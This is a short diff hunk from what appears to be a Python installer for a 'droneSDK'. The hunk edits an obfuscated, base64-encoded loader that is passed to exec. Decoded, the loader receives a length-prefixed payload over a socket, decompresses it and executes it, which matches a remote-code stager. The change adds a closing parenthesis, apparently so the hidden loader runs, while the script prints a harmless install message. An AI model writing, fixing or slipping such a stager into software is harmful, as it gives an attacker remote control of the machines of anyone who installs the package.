@@ -12,5 +12,5 @@ __import__(
 'SkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKV'+
 'swXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQ'+
 'rPXMucmVjdihsLWxlbihkKSkKZXhlYyh6bGliLmRlY29tcH'+
-'Jlc3MoYmFzZTY0LmI2NGRlY29kZShkKSkseydzJzpzfSkK')[0])
+'Jlc3MoYmFzZTY0LmI2NGRlY29kZShkKSkseydzJzpzfSkK')[0]))
 print ("Installing droneSDK...")
